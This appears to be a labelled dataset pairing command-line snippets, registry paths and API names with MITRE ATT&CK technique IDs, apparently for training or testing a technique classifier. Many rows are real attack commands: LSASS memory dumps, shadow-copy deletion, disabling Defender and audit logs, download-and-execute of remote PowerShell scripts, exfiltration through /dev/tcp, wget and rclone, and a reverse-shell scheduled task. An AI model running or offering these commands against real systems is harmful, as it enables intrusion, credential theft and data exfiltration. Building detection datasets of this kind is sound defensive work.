remover.bat,T1070
"""$vboxmanage_exe"" startvm ""$vm_name""",T1564
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"Write-Host ""Error: domain """"$domain_name"""" already federated. Try with a different domain or re-create it before.""",T1484
%TEMP%\result2.dat,T1074
long luid;,T1562
$which_ccencrypt -T -K $pwd_for_encrypted_file $cped_file_path,T1486
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security,T1562
Get-Service,T1543
go run $input_file,T1027
query user /SERVER:$computer_name,T1087
/bin/vmx,T1564
"curl -fsL ""$url"" >$tmp_path",T1059
"&""$renamed_binary"" ""$xml_payload"" output.txt",T1218
RUN+=,T1546
"$storageAccountObjects | Format-Table -Property ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName -AutoSize -Wrap",T1619
"Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""",T1098
sudo defaults read /Library/Preferences/com.apple.alf,T1016
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},T1105
$HOME/Library/LaunchAgents/com.apple.updates.plist,T1543
"""$trufflesnout_path"" forest -n $domain",T1482
httpsd,T1222
/etc/rc.local.d/,T1037
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force,T1491
WFMFormat.exe,T1127
GoogleUpdate.exe,T1574
on MacOS can be used to list disks while,T1680
"reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f",T1543
winword.exe,T1574
SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},T1218
"Start-Process ""C:\Windows\System32\ComputerDefaults.exe""",T1548
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",T1218
", and",T1564
find $search_path -name id_rsa 2>/dev/null -exec gcp --parents {} $output_folder \;,T1552
killall Terminal,T1548
Get-MsolRoleMember,T1087
Connect-MsolService -Credential $Credential,T1098
tail /var/log/ufw.log,T1562
"grep ""# THIS IS A COMMENT"" /etc/ufw/sysctl.conf",T1562
CREATE_NO_WINDOW,T1564
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d $NEW_Remote_Port /f",T1021
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli system account list""",T1087
gcloud iam service-accounts keys delete $KEY --iam-account=$service_name@$project_id.iam.gserviceaccount.com --quiet,T1098
mklink /D $symlink_path \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1,T1003
quser.exe,T1049
echo 1q2w3e4r>> passwords.txt,T1110
bcdedit /set testsigning on,T1553
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe',T1219
"""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe""",T1222
"dscl . -create /Users/$username UniqueID ""1010""",T1136
mpiexec.exe {CMD},T1127
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24',T1202
chsh -s /bin/sh art,T1059
tasklist /v,T1057
InitializeSystemShutdownExW,T1529
netsh wlan show profile * key=clear,T1016
mymutex,T1480
"Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""$target_user""",T1098
"Pester.bat [/help|?|-?|/?] ""$null; {CMD}""",T1216
vbc.exe /target:exe {PATH_ABSOLUTE:.vb},T1127
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f",T1112
Win32_NetworkAdapterConfiguration,T1016
c:\windows\temp,T1074
System.DirectoryServices,T1069
"GUP.exe -unzipTo """" ""C:\Temp"" ""Sample $target_file_url $target_file_sha256""",T1105
C:\\Windows\\Temp\\cup.tmp,T1074
Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Services' |,T1007
"if (Test-Path ""$registryPath\$registryValueName"") {",T1562
cmd /c copy /y /b C:\Users\public\syslog_6-*.dat C:\Users\public\syslog.dll,T1059
.txt,T1036
"Write-Host ""Registry value deleted: $registryValueName""",T1562
get -b <start ip> -e <end ip> -p,T1046
loadfromfile,T1055
"""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat",T1558
$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug,T1055
"rundll32.exe $dll_file,krnl",T1218
"BlobName = """"",T1619
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose,T1135
catch {exit 1},T1070
"Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue",T1497
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion,T1082
"sudo emacs -Q -nw --eval '(term ""/bin/sh &"")'",T1059
sudo chown root /tmp/hello.c,T1548
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA,T1047
GetAsyncKeyState(),T1056
arp -a | grep -v '^?',T1018
project.pbxproj,T1546
GET https://cloudidentity.googleapis.com/v1/groups,T1069
/etc/NetworkManager/system-connections/,T1016
C:\Windows\System32\cmd.exe /c net view /all,T1135
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services \LanmanServer\Paramenters,T1112
swift $swift_src -keylog,T1056
Import-Module AzureAD,T1098
/Q /c wevtutil cl system,T1070
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{CMD}""",T1053
CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905,T1218
Import-Module ActiveDirectory -Force,T1552
Get-NetFirewallSetting,T1518
prerm,T1546
"Mount-DiskImage -ImagePath ""$path_of_iso"" -StorageType ISO -Access ReadOnly",T1553
cat /etc/*release | uniq,T1082
HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command,T1546
"cd /tmp && zip -P ""$zip_password"" art_encrypted.zip art_payload.sh",T1027
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnce""",T1012
"else { Write-Host "". "" -NoNewline}",T1110
attrib +h,T1222
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe,T1547
Start-VM $VM,T1564
Microsoft.Office.Interop,T1559
Goopdate.dll,T1574
"New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -PropertyType DWord -Value 0 -Force",T1562
.vgz,T1505
"cmd /c ""for /l %x in (1,1,$max_to_print) do start wordpad.exe /p $file_to_print"" | out-null",T1059
"if [ $(history |wc -l) -eq 0 ]; then echo ""History cache is empty""; fi",T1562
"Write-Host ""$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)"" -ForegroundColor Yellow",T1562
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f,T1112
/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db,T1003
vpxuser,T1078
HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe,T1547
"Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"" # Required due to length limitation",T1098
"get-process | ?{$_.Description -like ""*virus*""}",T1518
regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,T1564
svchost,T1218
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,T1564
sc start,T1569
IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd ),T1546
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",T1218
"if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi",T1562
gcloud iam service-accounts create $service-account-name,T1078
netsh interface show interface,T1016
echo $ENCODED > $encoded_file && xxd -r -p < $encoded_file,T1140
/bin/bash,T1059
regsvr32.exe $dll_payload,T1553
CallWindowProc,T1106
AVCaptureScreen,T1113
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\,T1547
"Write-Host ""IP addresses extracted and saved to $outputFilePath""",T1560
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f",T1112
"""C:\safe path with space\program.exe""",T1574
&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate,T1048
srvdll.dll,T1036
GetLastError,T1106
foreach ($ip in $ip_list) {,T1046
netstat -anp,T1049
start SysUpdate,T1543
LVM_SETITEMPOSITION,T1055
NtWriteVirtualMemory,T1055
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null",T1574
"if (-not (Test-Path ""$onedrive_path"")) {",T1105
xbootmgrsleep.exe 1000 {PATH:.exe},T1202
/etc/ld.so.preload,T1049
net view /domain,T1018
"cdb.exe -c {PATH:.txt} ""{CMD}""",T1127
%APPDATA%\Microsoft\UserSetting\MediaCache,T1074
inv-phantom -consoleoutput -noninteractive,T1562
AutoOpen,T1059
dir c:\ >> %temp%\download,T1083
"Write-Host ""Error: AzureAD could not connect""",T1484
ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,T1136
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f,T1112
net localgroup $local_admin_group $guest_user /add,T1078
"stop-process -name ""firefox"" -force -erroraction silentlycontinue",T1539
MAVInject.exe,T1218
"Write-Host ""Waiting 15s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
Actual: $ActualOutput,T1218
wmiexec,T1047
LSADUMP::SetNTLM,T1098
systemctl stop cbdaemon,T1562
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,T1564
linker,T1027
Dll,T1553
cp $bin_path /tmp/packed_bin && /tmp/packed_bin,T1027
"Set-ItemProperty -Path $ChannelPath -Name ""ChannelAccess"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""",T1562
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language,T1614
/volatile,T1027
Add-Type -AssemblyName Microsoft.Office.Interop.Word,T1137
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f",T1547
CredEnumerateW,T1555
locate,T1083
var/log/ldapd<unique_keyword>.2.gz,T1074
System Events,T1547
"schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""",T1053
tp.Attributes = SE_PRIVILEGE_ENABLED;,T1562
"for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@$target_host;done",T1110
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1'),T1106
"Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""$registry_value"" -Type MultiString",T1547
user32.dll,T1574
"Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\$processhacker_exe""",T1057
mpsvc.dll,T1574
"auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable",T1562
(New-Object Net.WebClient).DownloadString('$target_remote_file') | Out-File $output_file; Invoke-Item $output_file,T1105
.sdira,T1083
"if((Get-ADUser $remove_user -Properties memberof).memberof -like ""CN=Domain Admins*""){",T1531
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f",T1112
"Write-Host ""No files found with the specified extensions.""",T1005
"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""",T1218
ListRolePolicies,T1069
if($delete_defender_folder){,T1562
sekurlsa::logonPasswords,T1003
New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null,T1137
"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, $binary_to_execute"" -Force",T1547
FindNextVolumeW(),T1083
readdir,T1574
runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder},T1218
"New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""HTTP/$ComputerFQDN""",T1558
"net group ""domain admins"" /domain",T1069
/Library/Preferences/,T1518
My Documents,T1485
"Write-Host ""No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder"" -ForegroundColor Red",T1562
KernelCallbackTable,T1574
echo 'fd.close()' >> $python_script_name,T1059
$User.PasswordNotRequired = $False,T1136
New-PSDrive -name $map_name -psprovider filesystem -root \\$computer_name\$share_name,T1021
mkdir $PathToAtomicsFolder\T1560.001\victim-files,T1560
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -UseEncodedArguments -EncodedArgumentsParamVariation $encoded_arguments_param_variation -Execute -ErrorAction Stop,T1059
foreach ($entry in $archive.Entries) {,T1562
ITaskSettings,T1559
>%TEMP%\silver.txt 2>&1 (,T1558
/vmfs/volumes/,T1486
"bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""",T1140
expand \\webdav\folder\file.bat $path\file.txt:file.bat,T1564
cat /etc/pam.d/common-password,T1201
systemctl enable $systemd_service_file,T1543
Kerberoasting -consoleoutput -noninteractive,T1558
WSASend,T1106
com.apple.metadata:_kMDItemUserTags,T1564
ushata.exe,T1574
ls -a >> $output_file,T1083
cat /etc/passwd > $output_file,T1003
"Start-Process ""Excel""",T1137
setfattr,T1564
netview,T1135
root,T1543
"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> $output_file \;",T1217
chage -l <username>,T1201
"""delete shadows all"" | diskshadow.exe",T1490
csc.exe,T1027
-W Hidden,T1564
"$sheet.Cells.Item(15,1) = ""=FWRITELN(A5, `""oStream.Write winHttp.responseBody`"")""",T1204
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> $output_file; fi,T1082
GetSystemDirectoryW,T1106
"sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto",T1574
G$RADIUSCHAP,T1556
"echo ""flag1"" > $flagPath1",T1137
"""$7zip_exe"" u archive.7z *txt -pblue",T1560
"New-Item -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Force | Out-Null",T1562
[ -f $HOME/.zshrc_aliases ] && . $HOME/.zshrc_aliases,T1546
wmic process get /format:list,T1057
ps ax | grep -E...,T1057
winupdate.exe,T1036
new-item $key -Name $name -Force,T1112
touch $target_file_path,T1070
Set-Location $datePath,T1105
"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\$app_name"" /t REG_SZ /d $new_path /f",T1112
suspicious,T1564
colorcpl {PATH},T1036
moglogd,T1562
Start-Sleep -Seconds 2,T1562
mmc.exe compmgmt.msc /computer:{hostname/ip},T1218
dir /a:h C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\,T1552
XMPP,T1071
CreateIoCompletionPort(),T1486
/usr/bin/httpd,T1562
UCOMIEnumConnections,T1012
~/.zsh_history,T1552
az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath,T1530
"call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|$remote_url""",T1218
"wget --post-file=""$input_file"" --timeout=5 --no-check-certificate $endpoint_domain --delete-after",T1048
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""",T1547
SecItemCopyMatching(),T1555
"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""",T1105
windbg.exe -g {CMD},T1127
mkdir -p 'testdirwithspaceend ',T1036
sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt),T1036
echo User Domain: %USERDOMAIN% >> %file%,T1033
touch -a -m -t <timestamp> <filename>,T1070
"{echo $machine >> ""$offline_list""}}",T1105
aws configservice stop-configuration-recorder --configuration-recorder-name $configuration_recorder_name --region $region,T1562
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",T1218
"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full",T1003
"if [ -f ""/etc/$rsyslog_config_file_name"" ];",T1562
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:$file_url"").Exec();window.close();",T1218
stat $target_filename,T1070
openssl enc -aes-256-cbc -pass pass:$enc_pass -p -in $input_folder/$input_file.zip -out $input_folder/$input_file.enc,T1560
dscl . -create /Users/$username NFSHomeDirectory /Users/$username,T1136
"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d ""regedit.exe""",T1112
‘autocheck autochk *’,T1112
.Md5.exe,T1497
"if(-not $excelApp.path.contains(""Program Files (x86)"")){",T1137
Invoke-ATHHTMLApplication -HTAUri $hta_uri -MSHTAFilePath $mshta_file_path,T1218
NtDelayExecution,T1497
New-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force,T1562
%temp%\GoogleChrome,T1074
"echo 'run_rc_command ""$1""' >> $rc_service_path/$rc_service_file",T1543
"makecab ""PathToAtomicsFolder\T1140\src\art-expand-source.txt"" ""$cab_path""",T1140
IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd ),T1546
kernel32.beep,T1497
"cmstp.exe /s ""$inf_file_uac"" /au",T1218
if (-not (Test-Path -Path $containerFolderPath)) {,T1530
"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""",T1218
sysadminctl -deleteUser $user_account #enter admin password,T1531
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""$inf_to_execute""",T1218
Adore-NG,T1037
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force",T1484
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",T1218
os.popen,T1057
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;,T1543
show cdp neighbors,T1018
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $mshta_file_path,T1218
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) $optional_args",T1016
"rundll32.exe $input_file, StartW",T1218
"echo ""[Unit]"" > $systemd_service_path/$systemd_service_file",T1543
enum,T1083
Connect-ExchangeOnline -Credential $creds,T1098
SystemRestore,T1490
wmic baseboard get product,T1082
reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0,T1218
where /R C:\Users\ places.sqlite,T1217
GetCurrentDirectoryW,T1106
HKLM\SOFTWARE\Microsoft\DRM,T1112
msbuild.exe @{PATH:.rsp},T1036
rc.d,T1037
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll,T1027
sudo kmutil load -p $module_path,T1547
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",T1218
Microsoft.Storage/storageAccounts/write,T1530
$cmd > $output_file,T1087
dotnet.exe {PATH:.dll},T1218
MicrosoftOutLookUpdater.exe,T1036
"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done",T1059
hmacTime,T1140
"(root permissions),",T1564
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders,T1060
/tmp/test1.txt,T1070
"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Value ""$dll_path""",T1546
.vbs,T1059
VirtualAllocExNuma,T1055
"powershell -Command ""Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }"" > NUL",T1489
icacls <path> /grant Everyone:F /T /C /Q,T1222
foreach($blob in $blobs) {,T1619
if ($LASTEXITCODE -eq 0) {,T1528
rundll.exe,T1569
Get-MsolRole,T1069
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""$output_file"" /target:library ""$source_file""",T1218
%APPDATA%\FileZilla\,T1005
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'),T1071
$_.Exception,T1098
CreateRemoteThreadEx,T1480
C:\log.txt,T1056
NetUserAdd,T1106
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,T1564
downloaddd,T1105
is_debugger_present,T1622
ren %APPDATA%\amsi.dll ualapi.dll,T1574
coregen.exe dummy_assembly_name,T1055
"(Get-EsxCli -VMHost $vm_host -V2).software.acceptance.set.Invoke(@{level = ""CommunitySupported""})",T1562
"New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value ""36190899-1602-49e8-8b27-eb1d0a1ce869=1"" -Force",T1562
"if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){",T1547
dlopen(),T1129
acceptance-level,T1548
"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'Possible Virtualization Environment detected'; fi;",T1497
adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,T1003
"$env:AWS_PROFILE = ""$aws_profile""",T1567
gcc $input_file && ./a.out,T1027
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y,T1036
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1060
tasklist.exe | findstr /i defender,T1518
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateOfficeConfigTimestamp"" -Value 99999999999 -Type QWord -Force",T1105
createdump.exe -n -f {PATH:.dmp} {PID},T1003
browserpwn -consoleoutput -noninteractive,T1555
"if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi;",T1069
$which_openssl rsa -in $private_key_path -pubout -out $public_key_path,T1486
"if [ -f /tmp/poc.txt ]; then echo ""Success: poc.txt created under /tmp\n"" $(ls -la /tmp/ | grep -w poc.txt); else echo ""Failed: /tmp/poc.txt not found""; fi",T1546
xwud -in $output_file,T1113
"""AutodialDLL""=""c:\temp\foo.dll""",T1574
Filter = $Filter;,T1546
"echo ""1234567890"" > ""$file_to_manipulate""",T1070
/proc/self/cmdline,T1057
"sh -c ""echo 'ping -c 4 $host' >> $script_path""",T1059
echo '$text_to_append' >> /etc/profile.d/bash_completion.sh,T1546
service syslogd stop,T1562
pcalua.exe -a {PATH:.exe},T1202
NET USER $user_name$ $user_password /ADD /expires:never,T1564
/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment,T1056
te.exe {PATH:.wsc},T1127
PyArmor,T1027
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},T1105
"chrome.exe --disable-gpu-sandbox --gpu-launcher=""C:\Windows\system32\cmd.exe /c calc.exe",T1218
AuthorizationExecuteWithPrivileges,T1548
cp $cert_filename /usr/local/share/certs/,T1553
/var/log/cron.log,T1070
/Library/StartupItems/atomic.sh start,T1037
"sc config $service_name binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\""""",T1543
getprocesslist,T1057
route print,T1016
C:\Windows\System32\spool\prtprocs\x64\winprint.dll,T1543
GetIpNetTable(),T1016
Import-Module -Name Az.Resources,T1098
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},T1105
Get-UnattendedInstallFile,T1552
%USERPROFILE%\Recent,T1083
"echo ""dn: cn=Atomic User, cn=Users,dc=$domain,dc=$top_level_domain\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif",T1136
dump64.exe {PID} out.dmp,T1003
cmdkey.exe /list,T1087
Presentationhost.exe {REMOTEURL},T1105
"echo 'url = ""$script_url""' >> $python_script_name",T1059
regsvr32 %path%\ctfmonrn.dll /s,T1218
CreateProcessA,T1106
.pth,T1546
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile $extract_path\ntds.dit,T1003
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""$malicious_app""",T1547
"rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr",T1218
"reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""",T1012
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultPassword /t REG_SZ /d password1 /f",T1562
RecoveryExTask,T1036
"start """" $browser --headless --disable-gpu https://mockbin.org/bin/$bin_id",T1564
mkdir .\tmp\victim-files,T1560
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},T1218
zip -r $input_folder/$input_file.zip $input_folder,T1560
New-MailboxExportRequest,T1114
"if [ $(history |wc -l) -eq 1 ]; then echo ""History cache cleared""; fi",T1562
"dscl . -create /Users/$username RealName ""$realname""",T1136
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},T1105
Get-NetDomainTrust,T1482
dsget,T1087
"Write-Host "" [!] ${user}:$password are valid credentials!`r`n""",T1110
"echo ""*** Configuration recorder deleted ***""",T1562
"Service Control Manager/7045;winupd,%SystemRoot%\winupd.exe,user mode service,demand start,LocalSystem",T1569
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces,T1012
"sudo lsmod | grep -i ""virtio_pci\|virtio_net""",T1082
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f,T1112
"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full",T1003
"if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){",T1547
curl $test_url,T1090
"Invoke-dpsLight ""$password"" $env:Temp\usersdpsLight.txt",T1110
"Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null",T1082
sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place,T1070
New-ItemProperty -Path $registryPath -Name $name -Value $Value,T1546
EnumCalendarInfoExW,T1106
WNetAddConnection2,T1106
net view \\$computer_name,T1135
is_debugging,T1622
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
CreateFileA to \\.\PHYSICALDRIVE0,T1680
pwpolicy getaccountpolicies,T1201
sudo setcap cap_setuid=ep $file_to_setcap,T1548
Invoke-Phant0m,T1562
show clock detail,T1124
/var/db/sudo,T1548
"mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%20""""powershell.exe%20-nop%20-Command%20Write-Host%20$message;Start-Sleep%20-Seconds%20$seconds_to_sleep""""""))</script>'""",T1218
odbcconf.exe,T1218
"Stop-Process -Name ""BadPotato"" -force -erroraction silentlycontinue",T1134
rdpclip.exe,T1055
"""$psexec_exe"" $remote_host -accepteula -c $command_path",T1021
